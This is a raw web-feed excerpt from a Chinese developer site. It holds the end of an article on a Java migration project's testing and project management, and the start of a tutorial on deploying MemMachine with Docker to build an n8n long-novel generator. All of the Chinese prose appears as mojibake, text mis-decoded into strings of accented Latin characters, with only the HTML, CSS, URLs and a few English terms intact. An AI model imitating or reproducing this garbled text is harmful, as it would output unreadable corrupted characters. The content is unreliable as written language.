<p>æˆ‘ä»¬é’ˆå¯¹æ¥å£å®¹æ˜“å‡ºé—®é¢˜çš„ç‚¹ï¼Œå¯¹åº”è¿›è¡Œäº†å¤šé¡¹ä¸“é¡¹æµ‹è¯•ï¼šåˆ†æµæµ‹è¯•ã€å¹¶å‘æµ‹è¯•ã€æœ¬åœ°åŒ–æµ‹è¯•ã€æ•…éšœæ³¨å…¥æµ‹è¯•ã€å…¼å®¹æ€§æµ‹è¯•ã€æ¢ç´¢æ€§æµ‹è¯•ã€æ€§èƒ½æµ‹è¯•ç­‰ï¼Œå‘ç°äº†å¾ˆå¤šæ·±åº¦BUGã€‚</p>
<p>æ¡ˆä¾‹ï¼š</p>
<p><img src="https://huolala.feishu.cn/space/api/box/stream/download/asynccode/?code=MWY1ZjY1OGFhMzgzNWJkMmVkNmZiNmZhNDBkYWY1NzVfZUxmVFc0MDJ1alF0b29sUnZNUVM2RUs1SmxZcVBCbndfVG9rZW46Q1Q2NmIzSGhXb3c3N2h4S1lBaGNTU3JkblhoXzE3NjU1MDQxNjk6MTc2NTUwNzc2OV9WNA" alt="" loading="lazy"/></p>
<h3 data-id="heading-14">é¡¹ç›®ç®¡ç†</h3>
<p>å½“æŠ€æœ¯å¤æ‚åº¦ä¸ç»„ç»‡/è§„æ¨¡å¤æ‚åº¦å åŠ ï¼Œå¤§å‹é¡¹ç›®å•çº¯ä¾é æŠ€æœ¯æ‰‹æ®µå¾€å¾€å®¹æ˜“å¤±æ§ã€‚æˆ‘ä»¬éœ€è¦åšå¥½é¡¹ç›®ç®¡ç†è§„åˆ’ï¼Œç¡®ä¿é¡¹ç›®èƒ½æŒ‰é¢„æœŸäº¤ä»˜ã€‚</p>
<h4 data-id="heading-15">é£é™©ç®¡ç†</h4>
<p>æå‰è¯†åˆ«æŠ€æœ¯ã€ä¸šåŠ¡ã€å›¢é˜Ÿã€å¤–éƒ¨ä¾èµ–å¸¦æ¥çš„é£é™©ã€‚åšå¥½é£é™©åº”å¯¹æªæ–½ã€‚ä¸€äº›å¸¸è§çš„é£é™©å’Œåº”å¯¹å¦‚ä¸‹ï¼š</p>
<ul>
<li>
<p>å›¢é˜Ÿé¡¹ç›®æ—©æœŸç»éªŒä¸è¶³ï¼šéœ€è¦æŒç»­åŸ¹è®­ã€‚</p>
</li>
<li>
<p>åˆ‡æµè¿‡ç¨‹å¯èƒ½å‡ºç°é—®é¢˜ï¼šéœ€è¦å›æ»šSOPã€‚</p>
</li>
<li>
<p>æœåŠ¡ä¸‹çº¿åï¼Œå‘ç°è¿˜æœ‰é—ç•™æµé‡ï¼šéœ€è¦æœåŠ¡ä¸‹çº¿SOPã€‚</p>
</li>
<li>
<p>é¡¹ç›®ä¸´æ—¶èµ„æºå†²çªï¼š éœ€è¦æ˜ç¡®çš„é¡¹ç›®ä¼˜å…ˆçº§å®šä¹‰ï¼Œåšå¥½èµ„æºå†²çªå‘ç°æœºåˆ¶å’Œé¢„æ¡ˆã€‚</p>
</li>
</ul>
<h4 data-id="heading-16">è¿›åº¦ç®¡ç†</h4>
<p>é¡¹ç›®å‚ä¸äººæ•°ä¼—å¤šï¼Œé¿å…ä½æ•ˆæ²Ÿé€šï¼Œè®©ç›¸å…³è´Ÿè´£äººä»ä½æ•ˆæ²Ÿé€šé‡Šæ”¾å‡ºæ¥ã€‚é£ä¹¦å¤šç»´è¡¨æ ¼ä½œä¸ºä¸€ç§è½»é‡çº§ä½ä»£ç å¹³å°ï¼Œåœ¨é¡¹ç›®ä¸­å¹¿æ³›åº”ç”¨åœ¨ä»¥ä¸‹åœºæ™¯ï¼š</p>
<p>**ä»»åŠ¡çŠ¶æ€å¯è§†åŒ–ï¼š**è®©å…³é”®ä¿¡æ¯æ— æ‰€éå½¢ï¼Œè¾…åŠ©å†³ç­–ã€‚</p>
<p><img src="https://huolala.feishu.cn/space/api/box/stream/download/asynccode/?code=OTlhMGQyODlmZDgyNmVjMGQxZjE1MDcyYmNiYmY2YjBfRTVVYkF0V0QzOVFDemZqemxoUFhJTk00NUI0bThJb0lfVG9rZW46THV3MmJOMWZGb1lETXB4czU5eWNJY3NvbmpmXzE3NjU1MDQxNjk6MTc2NTUwNzc2OV9WNA" alt="" loading="lazy"/></p>
<p>**è¿›åº¦é£é™©è§¦è¾¾ï¼š**è®©è¿›åº¦é£é™©å®æ—¶è§¦è¾¾ç›¸å…³äººå‘˜ï¼ŒåŠæ—¶å¹²é¢„ã€‚</p>
<p><img src="https://huolala.feishu.cn/space/api/box/stream/download/asynccode/?code=YjczNWRjNDdiMzU5NDZkMWRjMWI1MzU2MDc4YmRmMDdfRVZCY3lSZU5ReU5mSElHNTZOR3B6ZzBJY1NOTENRbE5fVG9rZW46VnN3V2J3Y2ZubzFJWHN4bW9CUWNoVTYzbmNnXzE3NjU1MDQxNjk6MTc2NTUwNzc2OV9WNA" alt="" loading="lazy"/></p>
<h2 data-id="heading-17">ç»“è¯­</h2>
<p>æœ¬æ–‡å®Œæ•´çš„è®°è¿°äº†Lalamoveä¸€æ¬¡JavaåŒ–å¤§å‹é¡¹ç›®çš„å®è·µè¿‡ç¨‹ï¼Œå¯ä»¥è¯´æ˜¯ä¸€æ¬¡ç›¸å¯¹å…¨é¢çš„ç»éªŒæ€»ç»“ã€‚å…¶ä¸­ä¸€äº›æ‰§è¡Œç»†èŠ‚ï¼Œä¹Ÿä¸æ˜¯ä¸€å¼€å§‹å°±èƒ½åšåˆ°é¢é¢ä¿±åˆ°ï¼Œä¸€äº›é—®é¢˜åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­è¢«è¯†åˆ«ï¼Œè§£å†³åæ²‰æ·€æˆç ”å‘SOPï¼Œæˆ–è€…å…¶ä»–é¡¹ç›®è§„èŒƒã€‚è¿™äº›ç»éªŒæ€»ç»“è€ƒè™‘åˆ°æ™®é€‚æ€§ï¼Œå¸Œæœ›å…¶ä¸­çš„æ–¹æ¡ˆèƒ½å¯¹è¯»è€…æœ‰æ‰€å¸®åŠ©ï¼Œé€šè¿‡å‚è€ƒï¼Œä¸ä»…ä»…èƒ½ä½¿ç”¨åœ¨JavaåŒ–é¡¹ç›®ï¼Œå…¶ä»–è¯­è¨€è¿ç§»é¡¹ç›®ï¼Œç”šè‡³å…¶ä»–çš„å¤§å‹é¡¹ç›®ä¸Šã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[çªç ´ LLM æé™ï¼n8n + MemMachine æ‰“é€ â€œæ— é™æµâ€å°è¯´ç”Ÿæˆå™¨]]></title>    <link>https://juejin.cn/post/7582561515816484927</link>    <guid>https://juejin.cn/post/7582561515816484927</guid>    <pubDate>2025-12-12T06:12:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582561515816484927" data-draft-id="7582422766731755563" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="çªç ´ LLM æé™ï¼n8n + MemMachine æ‰“é€ â€œæ— é™æµâ€å°è¯´ç”Ÿæˆå™¨"/> <meta itemprop="keywords" content="AIGC,äººå·¥æ™ºèƒ½,Agent"/> <meta itemprop="datePublished" content="2025-12-12T06:12:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åç«¯å°è‚¥è‚ "/> <meta itemprop="url" content="https://juejin.cn/user/2966945320667536"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            çªç ´ LLM æé™ï¼n8n + MemMachine æ‰“é€ â€œæ— é™æµâ€å°è¯´ç”Ÿæˆå™¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2966945320667536/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åç«¯å°è‚¥è‚ 
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-12T06:12:30.000Z" title="Fri Dec 12 2025 06:12:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å°è‚¥è‚ ï¼ä»Šå¤©æˆ‘ä»¬æç‚¹çœŸæ­£çš„é»‘ç§‘æŠ€ï¼ŒæŒ‘æˆ˜ä¸€ä¸‹å¤§æ¨¡å‹çš„â€œè®°å¿†æé™â€ã€‚é’ˆå¯¹AIå†™é•¿æ–‡å®¹æ˜“â€œå¤±å¿†â€çš„é¡½ç–¾ï¼Œæˆ‘ç”¨ <strong>n8n + MemMachine</strong> æ‰“é€ äº†ä¸€å¥—â€œæ°¸ä¸å¿˜è¯â€çš„æ— é™é•¿ç¯‡å°è¯´å·¥ä½œæµã€‚ä»å¤§çº²è®¾å®šåˆ°è‡ªåŠ¨è¿è½½ï¼Œå­—æ•°æ— ä¸Šé™ï¼Œå‰§æƒ…ä¸å´©åï¼Œä¸€é”®ç›´è¾¾é£ä¹¦ã€‚æƒ³è®©ä½ çš„ AI è¿›åŒ–æˆèƒ½å†™ç™¾ä¸‡å­—çš„â€œç½‘æ–‡å¤§ç¥â€å—ï¼Ÿç ä½è¿™ç¯‡æ•™ç¨‹ï¼Œå¸¦ä½ é›¶é—¨æ§›å®æ“èµ·é£ï¼</p>
<h2 data-id="heading-0">1. æ•ˆæœæ¼”ç¤º</h2>
<p>ä¸Šå‘¨æˆ‘å†™äº†ä¸€ä¸ªå†™å°è¯´çš„å·¥ä½œæµï¼Œå¾ˆå¤šè¯»è€…åé¦ˆèƒ½ä¸èƒ½çªç ´ç¯‡å¹…é™åˆ¶ï¼ŒçŸ­ç¯‡å°è¯´ä¸å¤Ÿçœ‹çš„ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªç—›ç‚¹ï¼Œæˆ‘åŸºäº <strong>MemMachine</strong> å®ç°äº†è¿™ä¸ªå¯ä»¥çªç ´å¤§æ¨¡å‹ä¸Šä¸‹æ–‡é™åˆ¶çš„ <strong>n8n æ— é™é•¿ç¯‡å°è¯´å·¥ä½œæµ</strong>ã€‚åšå‡ºæ¥ä»¥ååœ¨ç¾¤é‡Œå†…æµ‹ï¼Œåé¦ˆç›¸å½“ä¸é”™ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f16ba78af5a24eb8bd7f9e13f7f967cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766124750&amp;x-signature=EsNff3fqmyLgpZIRSQ9%2F7x8XbBU%3D" alt="" loading="lazy"/></p>
<p>ç°åœ¨çš„å·¥ä½œæµä¸€å…±ä¸ºä¸¤éƒ¨åˆ†ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f6844602725d4fa6a4e15fa07cb4328b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766124750&amp;x-signature=FuvYKdJE0rmlo4t0CPOkY%2FtyyG0%3D" alt="" loading="lazy"/></p>
<p><strong>ç¬¬ä¸€éƒ¨åˆ†</strong>æ˜¯å°†æœ¬åœ°å°è¯´å½•å…¥é£ä¹¦ç´ æåº“ã€‚æœ‰äº†è¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥åŸºäºè‡ªå®šä¹‰ç´ æï¼Œç¼–å†™ä»»æ„é¢†åŸŸé£æ ¼çš„å°è¯´ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce23c06e51d8473e90413aec49d7c27d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766124750&amp;x-signature=2t7%2FVMnRs4DbPAan3ksHqa%2FYDmY%3D" alt="" loading="lazy"/></p>
<p><strong>ç¬¬äºŒéƒ¨åˆ†</strong>æ˜¯è¯»å–ç´ æåº“ä¸­çš„å°è¯´ä½œä¸ºå‚è€ƒé…åˆ<strong>MemMachine</strong> è®°å¿†åº“ç¼–å†™é•¿ç¯‡å°è¯´ï¼Œä¸‹å›¾ä¸­å†™äº†æ•´æ•´16ç« ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd210b311d064fc380ea6773435c2cb7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766124750&amp;x-signature=9%2FBr1kQdpR1LwGngM0T7VaP%2FFYk%3D" alt="" loading="lazy"/></p>
<p>æ¯ç« çš„å­—æ•°åœ¨2000â€”3000å­—ï¼Œè¿œè¿œçªç ´äº†å¤§æ¨¡å‹ä¸Šä¸‹æ–‡é™åˆ¶ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fab79269d8344cf99c6f75a7546255d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766124750&amp;x-signature=aIxDEIVAYQ62jpS6c0h8lgPDjME%3D" alt="" loading="lazy"/></p>
<p>æ¥ä¸‹æ¥å°±æ­£å¼å¼€å§‹è¿™ä¸ªç¡¬æ ¸å·¥ä½œæµçš„æ­å»º~</p>
<h2 data-id="heading-1">2. å·¥ä½œæµæ¶æ„å‰–æå’Œå‰ç½®å‡†å¤‡</h2>
<h3 data-id="heading-2">2.1 é•¿ç¯‡å°è¯´å·¥ä½œæµæ¶æ„è¯´æ˜</h3>
<p>é•¿ç¯‡å°è¯´å·¥ä½œæµä¸»è¦ä¾èµ–äº<strong>MemMachineæ¥å­˜å‚¨ç« èŠ‚çš„è®°å¿†ï¼Œæ¯å†™å®Œä¸€ç« ä¼šå°†è¿™ç« çš„å†…å®¹å­˜å…¥è®°å¿†åº“ï¼Œä¸‹ä¸€ç« çš„ç¼–å†™å¯ä¾èµ–è¿™ä¸€ç« çš„å†…å®¹ã€‚</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9721119be744040b587ebd0d62a235a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766124750&amp;x-signature=NWaTB7tteogsSgVxCm0QEcHvGYo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">2.2 åŸºäºDockeréƒ¨ç½²MemMachine</h3>
<p><strong>MemMachine</strong>æ˜¯ä¸€ä¸ªå¼€æºçš„<strong>AI æ™ºèƒ½ä½“é€šç”¨è®°å¿†å±‚ï¼ˆUniversal Memory Layerï¼‰</strong> é¡¹ç›®ã€‚ç®€å•æ¥è¯´ï¼Œå®ƒçš„ç›®æ ‡æ˜¯è§£å†³å¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰é€šå¸¸å­˜åœ¨çš„<strong>å¤±å¿†</strong>é—®é¢˜ï¼ˆå³æ— çŠ¶æ€ï¼‰ï¼Œè®© AI æ™ºèƒ½ä½“èƒ½å¤Ÿåƒäººä¸€æ ·æ‹¥æœ‰é•¿æœŸè®°å¿†ã€ä¸ªæ€§åŒ–è®¤çŸ¥å’Œä¸Šä¸‹æ–‡ç†è§£èƒ½åŠ›ã€‚</p>
<p>ç°åœ¨çš„ AI è™½ç„¶èªæ˜ä½†éå¸¸å¥å¿˜ï¼Œä¸€æ—¦å…³é—­å¯¹è¯çª—å£æˆ–è€…æ¢ä¸€ä¸ªæ¨¡å‹ï¼Œå®ƒå°±ä¼šæŠŠä½ ä»¥å‰è¯´è¿‡çš„è¯å’Œä½ çš„ä¸ªäººå–œå¥½å¿˜å¾—ä¸€å¹²äºŒå‡€ã€‚MemMachine å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜è€Œè®¾è®¡çš„ä¸€ä¸ªå¤–æŒ‚å¤§è„‘ï¼Œå®ƒèƒ½åƒä¸€ä¸ªè¶…çº§è®°äº‹æœ¬ä¸€æ ·ï¼Œè‡ªåŠ¨æŠŠä½ çš„èŠå¤©è®°å½•ã€ä¹ æƒ¯åå¥½ï¼ˆæ¯”å¦‚æˆ‘ä¸åƒé¦™èœï¼‰å’Œå†å²äº‹ä»¶æ°¸ä¹…å­˜å‚¨ä¸‹æ¥ã€‚</p>
<p>è¿™æ ·åšæœ€å¤§çš„å¥½å¤„æ˜¯ï¼ŒAI æ‹¥æœ‰äº†é•¿æœŸè®°å¿†ã€‚å“ªæ€•ä½ è¿‡æ®µæ—¶é—´å†å›æ¥ï¼Œæˆ–è€…æ¢ç”¨äº†ä¸åŒå…¬å¸çš„ AI æ¨¡å‹ï¼Œåªè¦è¿ä¸Šè¿™ä¸ªç³»ç»Ÿï¼ŒAI å°±èƒ½ç«‹åˆ»æƒ³èµ·æ¥ä½ æ˜¯è°ä»¥åŠä½ ä»¬ä¹‹å‰çš„äº¤æƒ…ï¼Œä¸éœ€è¦ä½ é‡å¤å•°å—¦ã€‚å®ƒè®© AI ä»ä¸€ä¸ªæ¯æ¬¡è§é¢éƒ½è¦é‡æ–°è®¤è¯†çš„é™Œç”Ÿäººï¼Œå˜æˆäº†ä¸€ä¸ªçœŸæ­£æ‡‚ä½ ã€è®°å¾—ä½ ä¸€åˆ‡è¿‡å¾€çš„è€æœ‹å‹ã€‚</p>
<p><strong>æºç åœ°å€ï¼š</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMemMachine%2FMemMachine" target="_blank" title="https://github.com/MemMachine/MemMachine" ref="nofollow noopener noreferrer">github.com/MemMachine/â€¦</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5b8154267d3047f3b47c464b56918882~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766124750&amp;x-signature=GJZnhVqdYWINqabU8Bt7sGS%2Fxis%3D" alt="" loading="lazy"/></p>
<p>è¿›å…¥é¡µé¢åæˆ‘ä»¬å°±å¯ä»¥ç”¨git cloneæˆ–ä¸‹è½½å‹ç¼©åŒ…çš„å½¢å¼æ¥ä¸‹è½½æºç äº†ï¼Œæºç ä¸‹è½½å®Œåé¡¹ç›®çš„ç›®å½•å¦‚ä¸‹å›¾ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a837393c1de74baaab22236f57f1feb5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766124750&amp;x-signature=bJnxVd8Edz%2B4Ny%2F6Wmc2szc102A%3D" alt="" loading="lazy"/></p>
<p>åªéœ€è¦é…ç½®å¥½.envã€docker-compose.ymlã€configuration.ymlè¿™ä¸‰ä¸ªæ–‡ä»¶å°±å¯ä»¥åŸºäºDockeré¡ºåˆ©éƒ¨ç½²<strong>MemMachine</strong>åœ¨æœ¬åœ°äº†ã€‚</p>
<p><strong>MemMachine</strong>éƒ¨ç½²ä¹Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦åœ¨æ–‡ä»¶è·¯å¾„è¾“å‡ºcmdï¼Œåœ¨å¼¹å‡ºçš„å‘½ä»¤æç¤ºç¬¦ä¸­è¾“å…¥<strong>docker compose up -d</strong>å³å¯å®Œæˆéƒ¨ç½²ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c728e5c6d7d447599edda71c611cddc3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766124750&amp;x-signature=zumsdw0Crh6jcADWoX%2BiZqLjUUo%3D" alt="" loading="lazy"/></p>
<p>éƒ¨ç½²åå¯è®¿é—®<a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A8080%2Fdocs%25EF%25BC%258C%25E7%259C%258B%25E5%2588%25B0%25E5%25A6%2582%25E4%25B8%258B%25E7%2595%258C%25E9%259D%25A2%25E5%258D%25B3%25E4%25B8%25BA%25E6%2588%2590%25E5%258A%259F%25E3%2580%2582" target="_blank" title="http://localhost:8080/docs%EF%BC%8C%E7%9C%8B%E5%88%B0%E5%A6%82%E4%B8%8B%E7%95%8C%E9%9D%A2%E5%8D%B3%E4%B8%BA%E6%88%90%E5%8A%9F%E3%80%82" ref="nofollow noopener noreferrer">http://localhost:8080/docsï¼Œçœ‹åˆ°å¦‚ä¸‹ç•Œé¢å³ä¸ºæˆåŠŸã€‚</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c6aa0876b3c7414db66afe3e9c552a27~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766124750&amp;x-signature=kihAa4nOYxX8p2hHN6sMZbK8WCQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">3. å·¥ä½œæµæ­å»º</h2>
